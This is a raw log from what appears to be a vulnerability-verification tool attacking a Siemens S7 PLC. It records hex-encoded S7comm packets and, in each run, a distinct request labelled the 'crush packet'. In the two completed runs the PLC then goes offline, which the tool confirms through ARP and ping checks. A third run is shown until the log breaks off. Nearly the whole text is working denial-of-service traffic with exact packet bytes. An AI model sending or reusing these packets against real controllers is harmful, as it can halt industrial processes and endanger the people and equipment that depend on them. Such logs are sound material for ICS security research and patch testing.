[2021-12-19 20:24:27,735] [INFO] [verifyClient.connect] -> Start connect PLC
[2021-12-19 20:24:27,819] [INFO] [verifyClient.send_receive_s7_packet] -> [Connect request]0300001902f08032010000010000080000f000000a000a00f0
[2021-12-19 20:24:27,819] [INFO] [verifyClient.send_receive_s7_packet] -> [Connect responde]0300001b02f080320300000100000800000000f0000003000300f0
[2021-12-19 20:24:27,820] [INFO] [verifyClient.passiveDetect] -> start listen arp
[2021-12-19 20:24:27,820] [INFO] [vertifyPassiveARP.<module>] -> The Crush Packet is 43
[2021-12-19 20:24:27,822] [INFO] [verifyClient.send_s7_packet] -> [request]0300002102f080320700000200000800080001120411440100ff090004001c0000
[2021-12-19 20:24:28,036] [INFO] [verifyClient.send_s7_packet] -> [request]0300002102f080320700000300000800080001120411440100ff090004001c0000
[2021-12-19 20:24:28,242] [INFO] [verifyClient.send_s7_packet] -> [request]0300002102f080320700000400000800080001120411440100ff090004001c0000
[2021-12-19 20:24:28,447] [INFO] [verifyClient.send_s7_packet] -> [request]0300002102f080320700000500000800080001120411440100ff090004001c0000
[2021-12-19 20:24:28,653] [INFO] [verifyClient.send_s7_packet] -> [request]0300002102f080320700000600000800080001120411440100ff090004001c0000
[2021-12-19 20:24:28,870] [INFO] [verifyClient.send_s7_packet] -> [request]0300002102f080320700000700000800080001120411440100ff090004001c0000
[2021-12-19 20:24:29,075] [INFO] [verifyClient.send_s7_packet] -> [request]0300002102f080320700000800000800080001120411440100ff090004001c0000
[2021-12-19 20:24:29,278] [INFO] [verifyClient.send_s7_packet] -> [request]0300002102f080320700000900000800080001120411440100ff090004001c0000
[2021-12-19 20:24:29,482] [INFO] [verifyClient.send_s7_packet] -> [request]0300002102f080320700000a00000800080001120411440100ff090004001c0000
[2021-12-19 20:24:29,684] [INFO] [verifyClient.send_s7_packet] -> [request]0300002102f080320700000b00000800080001120411440100ff090004001c0000
[2021-12-19 20:24:29,892] [INFO] [verifyClient.send_s7_packet] -> [request]0300002102f080320700000c00000800080001120411440100ff090004001c0000
[2021-12-19 20:24:30,098] [INFO] [verifyClient.send_s7_packet] -> [request]0300002102f080320700000d00000800080001120411440100ff090004001c0000
[2021-12-19 20:24:30,300] [INFO] [verifyClient.send_s7_packet] -> [request]0300002102f080320700000e00000800080001120411440100ff090004001c0000
[2021-12-19 20:24:30,508] [INFO] [verifyClient.send_s7_packet] -> [request]0300002102f080320700000f00000800080001120411440100ff090004001c0000
[2021-12-19 20:24:30,714] [INFO] [verifyClient.send_s7_packet] -> [request]0300002102f080320700001000000800080001120411440100ff090004001c0000
[2021-12-19 20:24:30,918] [INFO] [verifyClient.send_s7_packet] -> [request]0300002102f080320700001100000800080001120411440100ff090004001c0000
[2021-12-19 20:24:31,125] [INFO] [verifyClient.send_s7_packet] -> [request]0300002102f080320700001200000800080001120411440100ff090004001c0000
[2021-12-19 20:24:31,330] [INFO] [verifyClient.send_s7_packet] -> [request]0300002102f080320700001300000800080001120411440100ff090004001c0000
[2021-12-19 20:24:31,534] [INFO] [verifyClient.send_s7_packet] -> [request]0300002102f080320700001400000800080001120411440100ff090004001c0000
[2021-12-19 20:24:31,737] [INFO] [verifyClient.send_s7_packet] -> [request]0300002102f080320700001500000800080001120411440100ff090004001c0000
[2021-12-19 20:24:31,944] [INFO] [verifyClient.send_s7_packet] -> [request]0300002102f080320700001600000800080001120411440100ff090004001c0000
[2021-12-19 20:24:32,148] [INFO] [verifyClient.send_s7_packet] -> [request]0300002102f080320700001700000800080001120411440100ff090004001c0000
[2021-12-19 20:24:32,352] [INFO] [verifyClient.send_s7_packet] -> [request]0300002102f080320700001800000800080001120411440100ff090004001c0000
[2021-12-19 20:24:32,555] [INFO] [verifyClient.send_s7_packet] -> [request]0300002102f080320700001900000800080001120411440100ff090004001c0000
[2021-12-19 20:24:32,760] [INFO] [verifyClient.send_s7_packet] -> [request]0300002102f080320700001a00000800080001120411440100ff090004001c0000
[2021-12-19 20:24:32,967] [INFO] [verifyClient.send_s7_packet] -> [request]0300002102f080320700001b00000800080001120411440100ff090004001c0000
[2021-12-19 20:24:33,175] [INFO] [verifyClient.send_s7_packet] -> [request]0300002102f080320700001c00000800080001120411440100ff090004001c0000
[2021-12-19 20:24:33,382] [INFO] [verifyClient.send_s7_packet] -> [request]0300002102f080320700001d00000800080001120411440100ff090004001c0000
[2021-12-19 20:24:33,585] [INFO] [verifyClient.send_s7_packet] -> [request]0300002102f080320700001e00000800080001120411440100ff090004001c0000
[2021-12-19 20:24:33,801] [INFO] [verifyClient.send_s7_packet] -> [request]0300002102f080320700001f00000800080001120411440100ff090004001c0000
[2021-12-19 20:24:34,006] [INFO] [verifyClient.send_s7_packet] -> [request]0300002102f080320700002000000800080001120411440100ff090004001c0000
[2021-12-19 20:24:34,212] [INFO] [verifyClient.send_s7_packet] -> [request]0300002102f080320700002100000800080001120411440100ff090004001c0000
[2021-12-19 20:24:34,418] [INFO] [verifyClient.send_s7_packet] -> [request]0300002102f080320700002200000800080001120411440100ff090004001c0000
[2021-12-19 20:24:34,624] [INFO] [verifyClient.send_s7_packet] -> [request]0300002102f080320700002300000800080001120411440100ff090004001c0000
[2021-12-19 20:24:34,829] [INFO] [verifyClient.send_s7_packet] -> [request]0300002102f080320700002400000800080001120411440100ff090004001c0000
[2021-12-19 20:24:35,032] [INFO] [verifyClient.send_s7_packet] -> [request]0300002102f080320700002500000800080001120411440100ff090004001c0000
[2021-12-19 20:24:35,241] [INFO] [verifyClient.send_s7_packet] -> [request]0300002102f080320700002600000800080001120411440100ff090004001c0000
[2021-12-19 20:24:35,445] [INFO] [verifyClient.send_s7_packet] -> [request]0300002102f080320700002700000800080001120411440100ff090004001c0000
[2021-12-19 20:24:35,649] [INFO] [verifyClient.send_s7_packet] -> [request]0300002102f080320700002800000800080001120411440100ff090004001c0000
[2021-12-19 20:24:35,858] [INFO] [verifyClient.send_s7_packet] -> [request]0300002102f080320700002900000800080001120411440100ff090004001c0000
[2021-12-19 20:24:36,062] [INFO] [verifyClient.send_s7_packet] -> [request]0300002102f080320700002a00000800080001120411440100ff090004001c0000
[2021-12-19 20:24:36,279] [INFO] [verifyClient.send_s7_packet] -> [request]0300002102f080320700002b00000800080001120411440100ff090004001c0000
[2021-12-19 20:24:36,483] [INFO] [verifyClient.send_s7_packet] -> [request]0300002102f080320700002c00000800080001120411440100ff090004001c0000
[2021-12-19 20:24:37,126] [INFO] [verifyClient.send_s7_packet] -> Send the crush packet
[2021-12-19 20:24:37,127] [INFO] [verifyClient.send_s7_packet] -> [request]0300001f02f080320100002d00000e00000401120a10010003000083000001
[2021-12-19 20:24:37,338] [INFO] [verifyClient.send_s7_packet] -> [request]0300002102f080320700002e00000800080001120411440100ff090004001c0000
[2021-12-19 20:24:37,555] [INFO] [verifyClient.send_s7_packet] -> [request]0300002102f080320700002f00000800080001120411440100ff090004001c0000
[2021-12-19 20:24:37,760] [INFO] [verifyClient.send_s7_packet] -> [request]0300002102f080320700003000000800080001120411440100ff090004001c0000
[2021-12-19 20:24:37,965] [INFO] [verifyClient.send_s7_packet] -> [request]0300002102f080320700003100000800080001120411440100ff090004001c0000
[2021-12-19 20:24:38,173] [INFO] [verifyClient.send_s7_packet] -> [request]0300002102f080320700003200000800080001120411440100ff090004001c0000
[2021-12-19 20:24:38,377] [INFO] [verifyClient.send_s7_packet] -> [request]0300002102f080320700003300000800080001120411440100ff090004001c0000
[2021-12-19 20:24:38,585] [INFO] [verifyClient.send_s7_packet] -> [request]0300002102f080320700003400000800080001120411440100ff090004001c0000
[2021-12-19 20:24:38,790] [INFO] [verifyClient.send_s7_packet] -> [request]0300002102f080320700003500000800080001120411440100ff090004001c0000
[2021-12-19 20:24:38,992] [INFO] [verifyClient.send_s7_packet] -> [request]0300002102f080320700003600000800080001120411440100ff090004001c0000
[2021-12-19 20:24:39,210] [INFO] [verifyClient.send_s7_packet] -> [request]0300002102f080320700003700000800080001120411440100ff090004001c0000
[2021-12-19 20:24:39,414] [INFO] [verifyClient.send_s7_packet] -> [request]0300002102f080320700003800000800080001120411440100ff090004001c0000
[2021-12-19 20:24:39,621] [INFO] [verifyClient.send_s7_packet] -> [request]0300002102f080320700003900000800080001120411440100ff090004001c0000
[2021-12-19 20:24:39,826] [INFO] [verifyClient.send_s7_packet] -> [request]0300002102f080320700003a00000800080001120411440100ff090004001c0000
[2021-12-19 20:24:40,030] [INFO] [verifyClient.send_s7_packet] -> [request]0300002102f080320700003b00000800080001120411440100ff090004001c0000
[2021-12-19 20:24:40,234] [INFO] [verifyClient.send_s7_packet] -> [request]0300002102f080320700003c00000800080001120411440100ff090004001c0000
[2021-12-19 20:24:40,439] [INFO] [verifyClient.send_s7_packet] -> [request]0300002102f080320700003d00000800080001120411440100ff090004001c0000
[2021-12-19 20:24:40,642] [INFO] [verifyClient.send_s7_packet] -> [request]0300002102f080320700003e00000800080001120411440100ff090004001c0000
[2021-12-19 20:24:40,848] [INFO] [verifyClient.send_s7_packet] -> [request]0300002102f080320700003f00000800080001120411440100ff090004001c0000
[2021-12-19 20:24:41,052] [INFO] [verifyClient.send_s7_packet] -> [request]0300002102f080320700004000000800080001120411440100ff090004001c0000
[2021-12-19 20:24:41,258] [INFO] [verifyClient.send_s7_packet] -> [request]0300002102f080320700004100000800080001120411440100ff090004001c0000
[2021-12-19 20:24:41,462] [INFO] [verifyClient.send_s7_packet] -> [request]0300002102f080320700004200000800080001120411440100ff090004001c0000
[2021-12-19 20:24:41,678] [INFO] [verifyClient.send_s7_packet] -> [request]0300002102f080320700004300000800080001120411440100ff090004001c0000
[2021-12-19 20:24:41,885] [INFO] [verifyClient.send_s7_packet] -> [request]0300002102f080320700004400000800080001120411440100ff090004001c0000
[2021-12-19 20:24:42,094] [INFO] [verifyClient.send_s7_packet] -> [request]0300002102f080320700004500000800080001120411440100ff090004001c0000
[2021-12-19 20:24:42,296] [INFO] [verifyClient.send_s7_packet] -> [request]0300002102f080320700004600000800080001120411440100ff090004001c0000
[2021-12-19 20:24:42,501] [INFO] [verifyClient.send_s7_packet] -> [request]0300002102f080320700004700000800080001120411440100ff090004001c0000
[2021-12-19 20:24:42,711] [INFO] [verifyClient.send_s7_packet] -> [request]0300002102f080320700004800000800080001120411440100ff090004001c0000
[2021-12-19 20:24:42,915] [INFO] [verifyClient.send_s7_packet] -> [request]0300002102f080320700004900000800080001120411440100ff090004001c0000
[2021-12-19 20:24:43,131] [INFO] [verifyClient.send_s7_packet] -> [request]0300002102f080320700004a00000800080001120411440100ff090004001c0000
[2021-12-19 20:24:43,339] [INFO] [verifyClient.send_s7_packet] -> [request]0300002102f080320700004b00000800080001120411440100ff090004001c0000
[2021-12-19 20:24:43,551] [INFO] [verifyClient.send_s7_packet] -> [request]0300002102f080320700004c00000800080001120411440100ff090004001c0000
[2021-12-19 20:24:43,766] [INFO] [verifyClient.send_s7_packet] -> [request]0300002102f080320700004d00000800080001120411440100ff090004001c0000
[2021-12-19 20:24:43,974] [INFO] [verifyClient.send_s7_packet] -> [request]0300002102f080320700004e00000800080001120411440100ff090004001c0000
[2021-12-19 20:24:44,180] [INFO] [verifyClient.send_s7_packet] -> [request]0300002102f080320700004f00000800080001120411440100ff090004001c0000
[2021-12-19 20:24:44,384] [INFO] [verifyClient.send_s7_packet] -> [request]0300002102f080320700005000000800080001120411440100ff090004001c0000
[2021-12-19 20:24:44,586] [INFO] [verifyClient.send_s7_packet] -> [request]0300002102f080320700005100000800080001120411440100ff090004001c0000
[2021-12-19 20:24:44,794] [INFO] [verifyClient.send_s7_packet] -> [request]0300002102f080320700005200000800080001120411440100ff090004001c0000
[2021-12-19 20:24:44,996] [INFO] [verifyClient.send_s7_packet] -> [request]0300002102f080320700005300000800080001120411440100ff090004001c0000
[2021-12-19 20:24:45,201] [INFO] [verifyClient.send_s7_packet] -> [request]0300002102f080320700005400000800080001120411440100ff090004001c0000
[2021-12-19 20:24:45,406] [INFO] [verifyClient.send_s7_packet] -> [request]0300002102f080320700005500000800080001120411440100ff090004001c0000
[2021-12-19 20:24:45,610] [INFO] [verifyClient.send_s7_packet] -> [request]0300002102f080320700005600000800080001120411440100ff090004001c0000
[2021-12-19 20:24:45,815] [INFO] [verifyClient.send_s7_packet] -> [request]0300002102f080320700005700000800080001120411440100ff090004001c0000
[2021-12-19 20:24:46,020] [INFO] [verifyClient.send_s7_packet] -> [request]0300002102f080320700005800000800080001120411440100ff090004001c0000
[2021-12-19 20:24:46,227] [INFO] [verifyClient.send_s7_packet] -> [request]0300002102f080320700005900000800080001120411440100ff090004001c0000
[2021-12-19 20:24:46,433] [INFO] [verifyClient.send_s7_packet] -> [request]0300002102f080320700005a00000800080001120411440100ff090004001c0000
[2021-12-19 20:24:46,637] [INFO] [verifyClient.send_s7_packet] -> [request]0300002102f080320700005b00000800080001120411440100ff090004001c0000
[2021-12-19 20:24:46,728] [INFO] [vertifyPassiveARP.passiveCallback] -> passiveDetect find a Crush
[2021-12-19 20:24:46,851] [INFO] [verifyClient.activeDetect] -> checking whether the PLC is online
[2021-12-19 20:24:58,892] [INFO] [verifyClient.activeDetect] -> the PLC is offline
[2021-12-19 20:24:58,892] [INFO] [vertifyPassiveARP.<module>] -> No: 1, sended packets 90 ,passiveDetected find a Crush, The activeDetect ans is Crush
[2021-12-19 20:25:04,133] [INFO] [verifyClient.connect] -> Start connect PLC
[2021-12-19 20:25:07,198] [INFO] [verifyClient.send_receive_s7_packet] -> [Connect request]0300001902f080320100005c0000080000f000000a000a00f0
[2021-12-19 20:25:07,198] [INFO] [verifyClient.send_receive_s7_packet] -> [Connect responde]0300001b02f080320300005c00000800000000f0000003000300f0
[2021-12-19 20:25:09,208] [INFO] [verifyClient.passiveDetect] -> start listen arp
[2021-12-19 20:25:09,208] [INFO] [vertifyPassiveARP.<module>] -> The Crush Packet is 11
[2021-12-19 20:25:09,213] [INFO] [verifyClient.send_s7_packet] -> [request]0300002102f080320700005d00000800080001120411440100ff090004001c0000
[2021-12-19 20:25:09,426] [INFO] [verifyClient.send_s7_packet] -> [request]0300002102f080320700005e00000800080001120411440100ff090004001c0000
[2021-12-19 20:25:09,628] [INFO] [verifyClient.send_s7_packet] -> [request]0300002102f080320700005f00000800080001120411440100ff090004001c0000
[2021-12-19 20:25:09,832] [INFO] [verifyClient.send_s7_packet] -> [request]0300002102f080320700006000000800080001120411440100ff090004001c0000
[2021-12-19 20:25:10,048] [INFO] [verifyClient.send_s7_packet] -> [request]0300002102f080320700006100000800080001120411440100ff090004001c0000
[2021-12-19 20:25:10,256] [INFO] [verifyClient.send_s7_packet] -> [request]0300002102f080320700006200000800080001120411440100ff090004001c0000
[2021-12-19 20:25:10,463] [INFO] [verifyClient.send_s7_packet] -> [request]0300002102f080320700006300000800080001120411440100ff090004001c0000
[2021-12-19 20:25:10,671] [INFO] [verifyClient.send_s7_packet] -> [request]0300002102f080320700006400000800080001120411440100ff090004001c0000
[2021-12-19 20:25:10,878] [INFO] [verifyClient.send_s7_packet] -> [request]0300002102f080320700006500000800080001120411440100ff090004001c0000
[2021-12-19 20:25:11,083] [INFO] [verifyClient.send_s7_packet] -> [request]0300002102f080320700006600000800080001120411440100ff090004001c0000
[2021-12-19 20:25:11,287] [INFO] [verifyClient.send_s7_packet] -> [request]0300002102f080320700006700000800080001120411440100ff090004001c0000
[2021-12-19 20:25:11,818] [INFO] [verifyClient.send_s7_packet] -> Send the crush packet
[2021-12-19 20:25:11,819] [INFO] [verifyClient.send_s7_packet] -> [request]0300001f02f080320100006800000e00000401120a10010003000083000001
[2021-12-19 20:25:12,034] [INFO] [verifyClient.send_s7_packet] -> [request]0300002102f080320700006900000800080001120411440100ff090004001c0000
[2021-12-19 20:25:12,240] [INFO] [verifyClient.send_s7_packet] -> [request]0300002102f080320700006a00000800080001120411440100ff090004001c0000
[2021-12-19 20:25:12,442] [INFO] [verifyClient.send_s7_packet] -> [request]0300002102f080320700006b00000800080001120411440100ff090004001c0000
[2021-12-19 20:25:12,644] [INFO] [verifyClient.send_s7_packet] -> [request]0300002102f080320700006c00000800080001120411440100ff090004001c0000
[2021-12-19 20:25:12,852] [INFO] [verifyClient.send_s7_packet] -> [request]0300002102f080320700006d00000800080001120411440100ff090004001c0000
[2021-12-19 20:25:13,056] [INFO] [verifyClient.send_s7_packet] -> [request]0300002102f080320700006e00000800080001120411440100ff090004001c0000
[2021-12-19 20:25:13,260] [INFO] [verifyClient.send_s7_packet] -> [request]0300002102f080320700006f00000800080001120411440100ff090004001c0000
[2021-12-19 20:25:13,465] [INFO] [verifyClient.send_s7_packet] -> [request]0300002102f080320700007000000800080001120411440100ff090004001c0000
[2021-12-19 20:25:13,668] [INFO] [verifyClient.send_s7_packet] -> [request]0300002102f080320700007100000800080001120411440100ff090004001c0000
[2021-12-19 20:25:13,875] [INFO] [verifyClient.send_s7_packet] -> [request]0300002102f080320700007200000800080001120411440100ff090004001c0000
[2021-12-19 20:25:14,080] [INFO] [verifyClient.send_s7_packet] -> [request]0300002102f080320700007300000800080001120411440100ff090004001c0000
[2021-12-19 20:25:14,287] [INFO] [verifyClient.send_s7_packet] -> [request]0300002102f080320700007400000800080001120411440100ff090004001c0000
[2021-12-19 20:25:14,493] [INFO] [verifyClient.send_s7_packet] -> [request]0300002102f080320700007500000800080001120411440100ff090004001c0000
[2021-12-19 20:25:14,700] [INFO] [verifyClient.send_s7_packet] -> [request]0300002102f080320700007600000800080001120411440100ff090004001c0000
[2021-12-19 20:25:14,907] [INFO] [verifyClient.send_s7_packet] -> [request]0300002102f080320700007700000800080001120411440100ff090004001c0000
[2021-12-19 20:25:15,114] [INFO] [verifyClient.send_s7_packet] -> [request]0300002102f080320700007800000800080001120411440100ff090004001c0000
[2021-12-19 20:25:15,322] [INFO] [verifyClient.send_s7_packet] -> [request]0300002102f080320700007900000800080001120411440100ff090004001c0000
[2021-12-19 20:25:15,529] [INFO] [verifyClient.send_s7_packet] -> [request]0300002102f080320700007a00000800080001120411440100ff090004001c0000
[2021-12-19 20:25:15,719] [INFO] [vertifyPassiveARP.passiveCallback] -> passiveDetect find a Crush
[2021-12-19 20:25:15,734] [INFO] [verifyClient.activeDetect] -> checking whether the PLC is online
[2021-12-19 20:25:27,770] [INFO] [verifyClient.activeDetect] -> the PLC is offline
[2021-12-19 20:25:27,771] [INFO] [vertifyPassiveARP.<module>] -> No: 2, sended packets 30 ,passiveDetected find a Crush, The activeDetect ans is Crush
[2021-12-19 20:25:33,108] [INFO] [verifyClient.connect] -> Start connect PLC
[2021-12-19 20:25:36,146] [INFO] [verifyClient.send_receive_s7_packet] -> [Connect request]0300001902f080320100007b0000080000f000000a000a00f0
[2021-12-19 20:25:36,147] [INFO] [verifyClient.send_receive_s7_packet] -> [Connect responde]0300001b02f080320300007b00000800000000f0000003000300f0
[2021-12-19 20:25:38,148] [INFO] [verifyClient.passiveDetect] -> start listen arp
[2021-12-19 20:25:38,149] [INFO] [vertifyPassiveARP.<module>] -> The Crush Packet is 75
[2021-12-19 20:25:38,151] [INFO] [verifyClient.send_s7_packet] -> [request]0300002102f080320700007c00000800080001120411440100ff090004001c0000
[2021-12-19 20:25:38,364] [INFO] [verifyClient.send_s7_packet] -> [request]0300002102f080320700007d00000800080001120411440100ff090004001c0000
[2021-12-19 20:25:38,567] [INFO] [verifyClient.send_s7_packet] -> [request]0300002102f080320700007e00000800080001120411440100ff090004001c0000
[2021-12-19 20:25:38,785] [INFO] [verifyClient.send_s7_packet] -> [request]0300002102f080320700007f00000800080001120411440100ff090004001c0000
[2021-12-19 20:25:38,990] [INFO] [verifyClient.send_s7_packet] -> [request]0300002102f080320700008000000800080001120411440100ff090004001c0000
[2021-12-19 20:25:39,195] [INFO] [verifyClient.send_s7_packet] -> [request]0300002102f080320700008100000800080001120411440100ff090004001c0000
[2021-12-19 20:25:39,403] [INFO] [verifyClient.send_s7_packet] -> [request]0300002102f080320700008200000800080001120411440100ff090004001c0000
[2021-12-19 20:25:39,619] [INFO] [verifyClient.send_s7_packet] -> [request]0300002102f080320700008300000800080001120411440100ff090004001c0000
[2021-12-19 20:25:39,821] [INFO] [verifyClient.send_s7_packet] -> [request]0300002102f080320700008400000800080001120411440100ff090004001c0000
[2021-12-19 20:25:40,027] [INFO] [verifyClient.send_s7_packet] -> [request]0300002102f080320700008500000800080001120411440100ff090004001c0000
[2021-12-19 20:25:40,232] [INFO] [verifyClient.send_s7_packet] -> [request]0300002102f080320700008600000800080001120411440100ff090004001c0000
[2021-12-19 20:25:40,435] [INFO] [verifyClient.send_s7_packet] -> [request]0300002102f080320700008700000800080001120411440100ff090004001c0000
[2021-12-19 20:25:40,640] [INFO] [verifyClient.send_s7_packet] -> [request]0300002102f080320700008800000800080001120411440100ff090004001c0000
[2021-12-19 20:25:40,845] [INFO] [verifyClient.send_s7_packet] -> [request]0300002102f080320700008900000800080001120411440100ff090004001c0000
[2021-12-19 20:25:41,051] [INFO] [verifyClient.send_s7_packet] -> [request]0300002102f080320700008a00000800080001120411440100ff090004001c0000
[2021-12-19 20:25:41,253] [INFO] [verifyClient.send_s7_packet] -> [request]0300002102f080320700008b00000800080001120411440100ff090004001c0000
[2021-12-19 20:25:41,457] [INFO] [verifyClient.send_s7_packet] -> [request]0300002102f080320700008c00000800080001120411440100ff090004001c0000
[2021-12-19 20:25:41,674] [INFO] [verifyClient.send_s7_packet] -> [request]0300002102f080320700008d00000800080001120411440100ff090004001c0000
[2021-12-19 20:25:41,878] [INFO] [verifyClient.send_s7_packet] -> [request]0300002102f080320700008e00000800080001120411440100ff090004001c0000
[2021-12-19 20:25:42,096] [INFO] [verifyClient.send_s7_packet] -> [request]0300002102f080320700008f00000800080001120411440100ff090004001c0000
[2021-12-19 20:25:42,303] [INFO] [verifyClient.send_s7_packet] -> [request]0300002102f080320700009000000800080001120411440100ff090004001c0000
[2021-12-19 20:25:42,517] [INFO] [verifyClient.send_s7_packet] -> [request]0300002102f080320700009100000800080001120411440100ff090004001c0000
[2021-12-19 20:25:42,724] [INFO] [verifyClient.send_s7_packet] -> [request]0300002102f080320700009200000800080001120411440100ff090004001c0000
[2021-12-19 20:25:42,940] [INFO] [verifyClient.send_s7_packet] -> [request]0300002102f080320700009300000800080001120411440100ff090004001c0000
[2021-12-19 20:25:43,155] [INFO] [verifyClient.send_s7_packet] -> [request]0300002102f080320700009400000800080001120411440100ff090004001c0000
[2021-12-19 20:25:43,358] [INFO] [verifyClient.send_s7_packet] -> [request]0300002102f080320700009500000800080001120411440100ff090004001c0000
[2021-12-19 20:25:43,575] [INFO] [verifyClient.send_s7_packet] -> [request]0300002102f080320700009600000800080001120411440100ff090004001c0000
[2021-12-19 20:25:43,781] [INFO] [verifyClient.send_s7_packet] -> [request]0300002102f080320700009700000800080001120411440100ff090004001c0000
[2021-12-19 20:25:43,984] [INFO] [verifyClient.send_s7_packet] -> [request]0300002102f080320700009800000800080001120411440100ff090004001c0000
[2021-12-19 20:25:44,189] [INFO] [verifyClient.send_s7_packet] -> [request]0300002102f080320700009900000800080001120411440100ff090004001c0000
[2021-12-19 20:25:44,395] [INFO] [verifyClient.send_s7_packet] -> [request]0300002102f080320700009a00000800080001120411440100ff090004001c0000
[2021-12-19 20:25:44,600] [INFO] [verifyClient.send_s7_packet] -> [request]0300002102f080320700009b00000800080001120411440100ff090004001c0000
[2021-12-19 20:25:44,803] [INFO] [verifyClient.send_s7_packet] -> [request]0300002102f080320700009c00000800080001120411440100ff090004001c0000
[2021-12-19 20:25:45,010] [INFO] [verifyClient.send_s7_packet] -> [request]0300002102f080320700009d00000800080001120411440100ff090004001c0000
[2021-12-19 20:25:45,216] [INFO] [verifyClient.send_s7_packet] -> [request]0300002102f080320700009e00000800080001120411440100ff090004001c0000
[2021-12-19 20:25:45,420] [INFO] [verifyClient.send_s7_packet] -> [request]0300002102f080320700009f00000800080001120411440100ff090004001c0000
[2021-12-19 20:25:45,626] [INFO] [verifyClient.send_s7_packet] -> [request]0300002102f08032070000a000000800080001120411440100ff090004001c0000
[2021-12-19 20:25:45,829] [INFO] [verifyClient.send_s7_packet] -> [request]0300002102f08032070000a100000800080001120411440100ff090004001c0000
[2021-12-19 20:25:46,046] [INFO] [verifyClient.send_s7_packet] -> [request]0300002102f08032070000a200000800080001120411440100ff090004001c0000
[2021-12-19 20:25:46,263] [INFO] [verifyClient.send_s7_packet] -> [request]0300002102f08032070000a300000800080001120411440100ff090004001c0000
[2021-12-19 20:25:46,481] [INFO] [verifyClient.send_s7_packet] -> [request]0300002102f08032070000a400000800080001120411440100ff090004001c0000
[2021-12-19 20:25:46,683] [INFO] [verifyClient.send_s7_packet] -> [request]0300002102f08032070000a500000800080001120411440100ff090004001c0000
[2021-12-19 20:25:46,888] [INFO] [verifyClient.send_s7_packet] -> [request]0300002102f08032070000a600000800080001120411440100ff090004001c0000
[2021-12-19 20:25:47,094] [INFO] [verifyClient.send_s7_packet] -> [request]0300002102f08032070000a700000800080001120411440100ff090004001c0000
[2021-12-19 20:25:47,297] [INFO] [verifyClient.send_s7_packet] -> [request]0300002102f08032070000a800000800080001120411440100ff090004001c0000
[2021-12-19 20:25:47,502] [INFO] [verifyClient.send_s7_packet] -> [request]0300002102f08032070000a900000800080001120411440100ff090004001c0000
[2021-12-19 20:25:47,720] [INFO] [verifyClient.send_s7_packet] -> [request]0300002102f08032070000aa00000800080001120411440100ff090004001c0000
[2021-12-19 20:25:47,925] [INFO] [verifyClient.send_s7_packet] -> [request]0300002102f08032070000ab00000800080001120411440100ff090004001c0000
[2021-12-19 20:25:48,130] [INFO] [verifyClient.send_s7_packet] -> [request]0300002102f08032070000ac00000800080001120411440100ff090004001c0000
[2021-12-19 20:25:48,333] [INFO] [verifyClient.send_s7_packet] -> [request]0300002102f08032070000ad00000800080001120411440100ff090004001c0000
[2021-12-19 20:25:48,538] [INFO] [verifyClient.send_s7_packet] -> [request]0300002102f08032070000ae00000800080001120411440100ff090004001c0000
[2021-12-19 20:25:48,740] [INFO] [verifyClient.send_s7_packet] -> [request]0300002102f08032070000af00000800080001120411440100ff090004001c0000
[2021-12-19 20:25:48,944] [INFO] [verifyClient.send_s7_packet] -> [request]0300002102f08032070000b000000800080001120411440100ff090004001c0000
[2021-12-19 20:25:49,151] [INFO] [verifyClient.send_s7_packet] -> [request]0300002102f08032070000b100000800080001120411440100ff090004001c0000
[2021-12-19 20:25:49,355] [INFO] [verifyClient.send_s7_packet] -> [request]0300002102f08032070000b200000800080001120411440100ff090004001c0000
[2021-12-19 20:25:49,562] [INFO] [verifyClient.send_s7_packet] -> [request]0300002102f08032070000b300000800080001120411440100ff090004001c0000
[2021-12-19 20:25:49,769] [INFO] [verifyClient.send_s7_packet] -> [request]0300002102f08032070000b400000800080001120411440100ff090004001c0000
[2021-12-19 20:25:49,973] [INFO] [verifyClient.send_s7_packet] -> [request]0300002102f08032070000b500000800080001120411440100ff090004001c0000
[2021-12-19 20:25:50,175] [INFO] [verifyClient.send_s7_packet] -> [request]0300002102f08032070000b600000800080001120411440100ff090004001c0000
[2021-12-19 20:25:50,378] [INFO] [verifyClient.send_s7_packet] -> [request]0300002102f08032070000b700000800080001120411440100ff090004001c0000
[2021-12-19 20:25:50,585] [INFO] [verifyClient.send_s7_packet] -> [request]0300002102f08032070000b800000800080001120411440100ff090004001c0000
[2021-12-19 20:25:50,787] [INFO] [verifyClient.send_s7_packet] -> [request]0300002102f08032070000b900000800080001120411440100ff090004001c0000
[2021-12-19 20:25:50,992] [INFO] [verifyClient.send_s7_packet] -> [request]0300002102f08032070000ba00000800080001120411440100ff090004001c0000
[2021-12-19 20:25:51,197] [INFO] [verifyClient.send_s7_packet] -> [request]0300002102f08032070000bb00000800080001120411440100ff090004001c0000
[2021-12-19 20:25:51,403] [INFO] [verifyClient.send_s7_packet] -> [request]0300002102f08032070000bc00000800080001120411440100ff090004001c0000
[2021-12-19 20:25:51,608] [INFO] [verifyClient.send_s7_packet] -> [request]0300002102f08032070000bd00000800080001120411440100ff090004001c0000
[2021-12-19 20:25:51,814] [INFO] [verifyClient.send_s7_packet] -> [request]0300002102f08032070000be00000800080001120411440100ff090004001c0000
[2021-12-19 20:25:52,018] [INFO] [verifyClient.send_s7_packet] -> [request]0300002102f08032070000bf00000800080001120411440100ff090004001c0000
[2021-12-19 20:25:52,221] [INFO] [verifyClient.send_s7_packet] -> [request]0300002102f08032070000c000000800080001120411440100ff090004001c0000
[2021-12-19 20:25:52,426] [INFO] [verifyClient.send_s7_packet] -> [request]0300002102f08032070000c100000800080001120411440100ff090004001c0000
[2021-12-19 20:25:52,633] [INFO] [verifyClient.send_s7_packet] -> [request]0300002102f08032070000c200000800080001120411440100ff090004001c0000
[2021-12-19 20:25:52,836] [INFO] [verifyClient.send_s7_packet] -> [request]0300002102f08032070000c300000800080001120411440100ff090004001c0000
[2021-12-19 20:25:53,042] [INFO] [verifyClient.send_s7_packet] -> [request]0300002102f08032070000c400000800080001120411440100ff090004001c0000
[2021-12-19 20:25:53,245] [INFO] [verifyClient.send_s7_packet] -> [request]0300002102f08032070000c500000800080001120411440100ff090004001c0000
[2021-12-19 20:25:53,449] [INFO] [verifyClient.send_s7_packet] -> [request]0300002102f08032070000c600000800080001120411440100ff090004001c0000
[2021-12-19 20:25:53,969] [INFO] [verifyClient.send_s7_packet] -> Send the crush packet
[2021-12-19 20:25:53,970] [INFO] [verifyClient.send_s7_packet] -> [request]0300001f02f08032010000c700000e00000401120a10010003000083000001
[2021-12-19 20:25:54,174] [INFO] [verifyClient.send_s7_packet] -> [request]0300002102f08032070000c800000800080001120411440100ff090004001c0000
[2021-12-19 20:25:54,391] [INFO] [verifyClient.send_s7_packet] -> [request]0300002102f08032070000c900000800080001120411440100ff090004001c0000
